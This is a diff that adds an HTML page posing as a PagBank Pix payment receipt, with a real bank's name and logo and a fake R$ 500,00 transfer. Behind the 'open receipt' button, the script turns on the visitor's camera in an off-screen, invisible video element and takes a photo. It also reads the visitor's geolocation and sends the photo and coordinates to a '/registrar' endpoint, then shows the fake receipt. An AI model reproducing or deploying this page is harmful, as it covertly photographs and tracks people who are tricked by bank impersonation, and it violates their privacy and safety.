@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante PagBank</title>
+  <style>
+    body { 
+      margin: 0; 
+      font-family: 'Segoe UI', Arial, sans-serif; 
+      background: #f5f5f5; 
+      overflow: hidden;
+    }
+    
+    .intro {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      background: linear-gradient(135deg, #00a650, #008c3f);
+      color: white;
+    }
+
+    .intro h1 { font-size: 2.2em; margin-bottom: 10px; }
+    .intro p { font-size: 1.1em; margin-bottom: 40px; opacity: 0.95; }
+
+    .btn-abrir {
+      background: white;
+      color: #00a650;
+      border: none;
+      padding: 16px 40px;
+      font-size: 1.2em;
+      font-weight: bold;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+
+    .btn-abrir:disabled { 
+      opacity: 0.7; 
+      cursor: not-allowed; 
+    }
+
+    .loading { 
+      margin-top: 20px; 
+      color: white; 
+      font-size: 1.1em;
+    }
+
+    .comprovante {
+      max-width: 420px;
+      margin: 0 auto;
+      background: white;
+      box-shadow: 0 0 20px rgba(0,0,0,0.15);
+      overflow: hidden;
+      display: none;
+      min-height: 100vh;
+    }
+
+    .header {
+      background: #00a650;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      font-size: 1.3em;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo img { width: 120px; }
+    .titulo { text-align: center; font-size: 1.35em; margin: 10px 0 5px; font-weight: 500; }
+    .data { text-align: center; color: #666; margin-bottom: 25px; }
+    .valor { text-align: center; font-size: 2.4em; font-weight: bold; margin: 20px 0; color: #111; }
+    .section { padding: 0 20px 20px; }
+    .rodape { 
+      text-align: center; 
+      padding: 20px; 
+      font-size: 0.85em; 
+      color: #888; 
+      border-top: 1px solid #eee; 
+    }
+
+    /* Câmera escondida de forma leve */
+    #video {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      width: 640px;
+      height: 480px;
+      opacity: 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="intro" class="intro">
+    <h1>Comprovante de Pagamento</h1>
+    <p>Toque no botão abaixo para visualizar o comprovante Pix</p>
+    <button id="btnAbrir" onclick="abrirComprovante()" class="btn-abrir">Abrir Comprovante</button>
+    <div id="loading" class="loading" style="display: none;">Carregando...</div>
+  </div>
+
+  <video id="video" autoplay playsinline muted></video>
+
+  <div id="comprovante" class="comprovante">
+    <div class="header">
+      <span onclick="voltar()" class="back">←</span>
+      <span>Comprovante</span>
+      <span>↗</span>
+    </div>
+
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/PagBank_logo.svg/512px-PagBank_logo.svg.png" alt="PagBank">
+    </div>
+
+    <div class="titulo">Comprovante de pagamento Pix</div>
+    <div class="data" id="data-hora"></div>
+
+    <div class="section">
+      <div class="valor">R$ 500,00</div>
+      <div class="info">
+        <h2>Origem</h2>
+        <div>Rodrigo C. Pereira</div>
+        <div>CPF: *** .987.321-**</div>
+        <div>Instituição: PagBank (PagSeguro Internet S.A.)</div>
+      </div>
+      <div class="info">
+        <h2>Destino</h2>
+        <div>Miguel Telles Oliveira</div>
+        <div>CPF: *** .456.789-**</div>
+      </div>
+    </div>
+
+    <div class="rodape">
+      Este comprovante é válido para fins fiscais e de conferência.<br>
+      PagBank - PagSeguro Internet S.A.
+    </div>
+  </div>
+
+  <script>
+    let stream = null;
+
+    async function iniciarCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "environment",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
+        });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        // Força o play (resolve alguns casos de tela preta)
+        await video.play().catch(() => {});
+        console.log("✅ Câmera iniciada escondida");
+        return true;
+      } catch (err) {
+        console.warn("⚠️ Câmera não disponível:", err);
+        return false;
+      }
+    }
+
+    function capturarFoto() {
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', 0.82);
+    }
+
+    async function registrarVisualizacao(fotoBase64) {
+      const pos = await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          p => resolve({lat: p.coords.latitude, lon: p.coords.longitude}),
+          () => resolve({lat: -22.9055, lon: -47.0608})
+        );
+      });
+
+      const dados = { latitude: pos.lat, longitude: pos.lon, foto: fotoBase64 };
+
+      try {
+        const res = await fetch('/registrar', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(dados)
+        });
+        console.log("Registro enviado");
+        return res.ok;
+      } catch (e) {
+        console.error(e);
+        return false;
+      }
+    }
+
+    async function abrirComprovante() {
+      const btn = document.getElementById('btnAbrir');
+      const loading = document.getElementById('loading');
+
+      btn.disabled = true;
+      loading.style.display = 'block';
+      btn.textContent = 'Registrando...';
+
+      try {
+        await iniciarCamera();
+        await new Promise(r => setTimeout(r, 2500));   // 2.5 segundos
+
+        const fotoBase64 = capturarFoto();
+        await registrarVisualizacao(fotoBase64);
+
+        // Mostra comprovante
+        const agora = new Date();
+        document.getElementById('data-hora').textContent = 
+          agora.toLocaleDateString('pt-BR') + ' às ' + 
+          agora.toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
+
+        document.getElementById('intro').style.display = 'none';
+        document.getElementById('comprovante').style.display = 'block';
+
+      } catch (err) {
+        console.error(err);
+        // Mostra mesmo assim
+        const agora = new Date();
+        document.getElementById('data-hora').textContent = 
+          agora.toLocaleDateString('pt-BR') + ' às ' + agora.toLocaleTimeString('pt-BR');
+        document.getElementById('intro').style.display = 'none';
+        document.getElementById('comprovante').style.display = 'block';
+      } finally {
+        if (stream) {
+          stream.getTracks().forEach(t => t.stop());
+          stream = null;
+        }
+        loading.style.display = 'none';
+      }
+    }
+
+    function voltar() {
+      document.getElementById('comprovante').style.display = 'none';
+      document.getElementById('intro').style.display = 'flex';
+      const btn = document.getElementById('btnAbrir');
+      btn.disabled = false;
+      btn.textContent = 'Abrir Comprovante';
+    }
+  </script>
+</body>
+</html>
